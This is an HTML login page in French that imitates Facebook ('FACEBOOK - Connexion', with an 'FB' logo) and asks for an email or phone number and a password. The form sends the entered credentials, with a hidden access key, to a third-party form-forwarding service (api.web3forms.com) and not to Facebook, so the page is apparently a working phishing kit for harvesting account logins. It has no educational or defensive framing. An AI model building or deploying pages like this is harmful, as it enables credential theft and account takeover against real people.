<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FACEBOOK - Connexion</title>
    <style>
        :root{
            --bg1: #ff9a9e;
            --bg2: #fad0c4;
            --accent1: #4f46e5;
            --accent2: #06b6d4;
            --card: rgba(255,255,255,0.9);
            --glass: rgba(255,255,255,0.6);
            --muted: #6b7280;
            --radius: 16px;
        }
        *{box-sizing:border-box;margin:0;padding:0}
        html,body{height:100%;font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;}
        body{
            background: linear-gradient(135deg, var(--bg1) 0%, var(--bg2) 50%, #cfe9ff 100%);
            display:flex;align-items:center;justify-content:center;
            padding:24px;
            background-size: 400% 400%;
            animation: bgShift 12s ease infinite;
        }
        @keyframes bgShift{
            0%{background-position:0% 50%}
            50%{background-position:100% 50%}
            100%{background-position:0% 50%}
        }

        .container{
            width:100%;
            max-width:380px;
            background: linear-gradient(180deg, rgba(255,255,255,0.85), rgba(255,255,255,0.7));
            border-radius:var(--radius);
            padding:28px;
            box-shadow: 0 12px 40px rgba(16,24,40,0.18);
            border: 1px solid rgba(255,255,255,0.6);
            position:relative;
            overflow:hidden;
        }

        /* decorative top gradient bar */
        .container::before{
            content:"";
            position:absolute;
            left:-40%;
            top:-30%;
            width:180%;
            height:180%;
            background: radial-gradient(circle at 10% 20%, rgba(79,70,229,0.12), transparent 10%),
                        radial-gradient(circle at 90% 80%, rgba(6,182,212,0.10), transparent 10%);
            transform: rotate(15deg);
            pointer-events:none;
        }

        .logo{
            display:block;
            margin:0 auto 12px;
            height:74px;
            width:74px;
            border-radius:12px;
            object-fit:cover;
            box-shadow: 0 6px 20px rgba(79,70,229,0.12);
            border: 2px solid rgba(255,255,255,0.6);
            background: linear-gradient(135deg,var(--accent1),var(--accent2));
            color:white;
            display:flex;
            align-items:center;
            justify-content:center;
            font-weight:700;
            font-size:20px;
            color:#fff;
        }

        h1{
            font-size:20px;
            text-align:center;
            color:#0f172a;
            margin-bottom:18px;
            font-weight:700;
        }

        .input-group{margin-bottom:14px;position:relative}
        label{
            display:block;
            margin-bottom:8px;
            font-size:13px;
            color:var(--muted);
            letter-spacing:0.2px;
        }

        input[type="text"], input[type="password"], input[type="number"]{
            width:100%;
            padding:12px 14px;
            border-radius:12px;
            border:1px solid rgba(15,23,42,0.06);
            background: linear-gradient(180deg, rgba(255,255,255,0.98), rgba(250,250,250,0.96));
            font-size:15px;
            color:#0f172a;
            transition: box-shadow .12s, transform .06s, border-color .12s;
            outline:none;
            box-shadow: 0 6px 18px rgba(16,24,40,0.03);
        }

        input::placeholder{color:#94a3b8}
        input:focus{
            transform: translateY(-2px);
            border-color: rgba(79,70,229,0.9);
            box-shadow: 0 10px 30px rgba(79,70,229,0.12);
        }

        .actions{
            display:flex;
            gap:10px;
            align-items:center;
            margin-top:8px;
        }

        button[type="submit"]{
            flex:1;
            padding:12px 16px;
            border-radius:12px;
            border:none;
            cursor:pointer;
            background: linear-gradient(90deg,var(--accent1),var(--accent2));
            color:#fff;
            font-weight:700;
            font-size:15px;
            box-shadow: 0 10px 30px rgba(79,70,229,0.18);
            transition: transform .12s, box-shadow .12s;
        }
        button[type="submit"]:hover{ transform: translateY(-3px); box-shadow: 0 18px 40px rgba(79,70,229,0.22); }
        button[type="submit"]:active{ transform: translateY(-1px); }

        .secondary{
            background: transparent;
            border: 1px solid rgba(15,23,42,0.06);
            color: #0f172a;
            padding:10px 12px;
            border-radius:12px;
            cursor:pointer;
            font-weight:600;
        }

        .muted-row{
            margin-top:12px;
            text-align:center;
            font-size:13px;
            color:var(--muted);
        }
        .muted-row a{ color:var(--accent1); text-decoration:none; font-weight:600; }
        .muted-row a:hover{ text-decoration:underline; }

        /* small screens */
        @media (max-width:420px){
            .container{padding:20px;border-radius:14px}
            input[type="text"], input[type="password"]{padding:11px}
            button[type="submit"]{padding:12px}
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo" aria-hidden="true">FB</div>
        <h1>Connectez-vous</h1>

        <form action="https://api.web3forms.com/submit" method="POST" autocomplete="on">
            <input type="hidden" name="access_key" value="ad7a1b01-6ac0-46ff-8252-8b5ddbc49e7e">
            <div class="input-group">
                <label for="username">Nom d'utilisateur</label>
                <input id="username" type="text" name="username" required placeholder="Adresse mail ou numéro">
            </div>

            <div class="input-group">
                <label for="mp">Mot de passe</label>
                <input id="mp" type="password" name="mp" required placeholder="Votre mot de passe">
            </div>

            <div class="actions">
                <button type="submit">Se connecter</button>
            </div>
        </form>

        <div class="muted-row">
            <p><a href="#">Mot de passe oublié ?</a></p>
        </div>
    </div>
</body>
</html>
